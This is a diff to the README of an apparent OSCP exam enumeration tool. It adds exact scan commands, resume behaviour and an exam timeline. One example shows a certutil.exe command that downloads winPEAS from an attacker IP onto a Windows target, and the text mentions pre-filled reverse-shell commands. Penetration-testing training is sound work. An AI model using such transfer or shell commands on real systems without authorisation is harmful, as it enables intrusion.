@@ -17,12 +17,13 @@
 ## Table of Contents
 
 1. [Installation](#installation)
-2. [How to Run It — CLI Commands](#how-to-run-it)
-3. [The Automation Flow](#the-automation-flow)
-4. [The Lifecycle of a Finding](#the-lifecycle-of-a-finding)
-5. [Output Structure](#output-structure)
-6. [Module Reference](#module-reference)
-7. [OSCP Compliance Rules](#oscp-compliance-rules)
+2. [OSCP Exam — Exact Commands](#oscp-exam--exact-commands)
+3. [How to Run It — CLI Reference](#how-to-run-it)
+4. [The Automation Flow](#the-automation-flow)
+5. [The Lifecycle of a Finding](#the-lifecycle-of-a-finding)
+6. [Output Structure](#output-structure)
+7. [Module Reference](#module-reference)
+8. [OSCP Compliance Rules](#oscp-compliance-rules)
 
 ---
 
@@ -46,21 +47,114 @@ runs a smoke-test that imports every Python module.
 
 ---
 
+## OSCP Exam — Exact Commands
+
+Copy these commands at exam start. Replace `<TARGET>`, `<DOMAIN>`, and `<YOUR_TUN0>` with your actual values.
+
+### Step 1 — Find your tun0 IP (run once at exam start)
+
+```bash
+ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
+# Example output: 10.10.14.5
+```
+
+### Step 2 — Enumerate a standalone Linux/Windows target
+
+```bash
+python main.py \
+  --target <TARGET> \
+  --lhost <YOUR_TUN0> \
+  --output-dir /root/oscp/exam
+```
+
+### Step 3 — Enumerate an Active Directory target (with domain)
+
+```bash
+python main.py \
+  --target <TARGET> \
+  --domain <DOMAIN> \
+  --lhost <YOUR_TUN0> \
+  --output-dir /root/oscp/exam
+```
+
+### Step 4 — If the session was interrupted, resume it
+
+```bash
+# --resume loads session.json, skips Nmap, continues from where you left off
+python main.py \
+  --target <TARGET> \
+  --domain <DOMAIN> \
+  --lhost <YOUR_TUN0> \
+  --output-dir /root/oscp/exam \
+  --resume
+```
+
+> **Why `--resume` is explicit:**  
+> Without `--resume`, the framework always starts a fresh scan even if `session.json`
+> exists. This prevents accidentally skipping a service that appeared after a network
+> change. You must consciously opt-in to resume.
+
+### Step 5 — Review the output
+
+```bash
+# Open the report in any Markdown viewer
+cat /root/oscp/exam/<TARGET>/notes.md
+
+# Monitor in real time while enumeration runs
+watch -n 5 cat /root/oscp/exam/<TARGET>/notes.md
+
+# Check for background vuln scan results (the framework alerts you when done)
+cat /root/oscp/exam/<TARGET>/scans/vulns.txt
+```
+
+### What `--lhost` does
+
+When you pass `--lhost 10.10.14.5`, the Arsenal Recommender section of `notes.md`
+pre-fills **every** transfer and reverse-shell command with your attacker IP:
+
+```markdown
+# Without --lhost (default):
+- [ ] 💡 `certutil.exe -urlcache -f http://<LHOST>:8000/windows/winPEAS.exe C:\Windows\Temp\winPEAS.exe`
+
+# With --lhost 10.10.14.5:
+- [ ] 💡 `certutil.exe -urlcache -f http://10.10.14.5:8000/windows/winPEAS.exe C:\Windows\Temp\winPEAS.exe`
+```
+
+You can copy-paste directly — no manual editing required.
+
+### Typical exam timeline
+
+```
+T+00:00  python main.py --target 10.10.10.10 --lhost 10.10.14.5
+T+00:05  Nmap fast scan finishes → open ports known
+T+00:10  Background NSE vuln scan launches (runs in parallel)
+T+00:15  Tier-1 modules finish (SMB · FTP · LDAP · DNS · SNMP · NFS)
+T+00:30  Tier-2 modules finish (Databases · Remote · Mail)
+T+02:00  Tier-3 finishes (Web — feroxbuster/gobuster on all ports)
+         🔔 DING! — NSE vuln scan alert fires
+T+02:01  notes.md complete — open it and start manual work
+```
+
+---
+
 ## How to Run It
 
 ### Standard full-auto scan (most common)
 
 ```bash
-python main.py --target 10.10.10.10
+# With your tun0 IP so Arsenal Recommender commands are pre-filled
+python main.py --target 10.10.10.10 --lhost 10.10.14.5
 ```
 
 Runs Nmap discovery → detects all open services → routes each service to the
 correct enumeration module → writes `notes.md` with findings and checklist.
+Per-module elapsed time is printed after each module. Total session time is
+shown at the end.
 
 ### With a known domain (Active Directory / Windows targets)
 
 ```bash
-python main.py --target 10.10.10.10 --domain corp.local
+python main.py --target 10.10.10.10 --domain corp.local --lhost 10.10.14.5
 ```
 
 The domain is passed to LDAP (base DN queries), DNS (zone transfer, TXT records),
@@ -96,15 +190,22 @@ Available module names:
 | 2 — Medium | `databases` `remote` `mail` |
 | 3 — Heavy (always last) | `web` |
 
-### Resume a previous session
+### Resume a previous session (explicit opt-in)
 
-Re-run the exact same command. The framework reads `session.json` from the
-previous run and skips Nmap — going straight to module execution with the
-already-discovered port list.
+Pass `--resume` to load `session.json` from the previous run and skip Nmap.
+**Without `--resume`, the framework always starts fresh** — even if `session.json`
+exists — so you never accidentally skip a service that appeared after a change.
 
 ```bash
-python main.py --target 10.10.10.10  # picks up where it left off
+# Continue where you left off after an interruption
+python main.py --target 10.10.10.10 --lhost 10.10.14.5 --resume
+
+# Resume with a domain (if domain was discovered in the first run)
+python main.py --target 10.10.10.10 --domain corp.local --lhost 10.10.14.5 --resume
 ```
+
+When resumed, the banner shows `Mode: RESUME` and a green panel lists the
+already-known ports so you immediately see the session state.
 
 ### Custom output directory
 
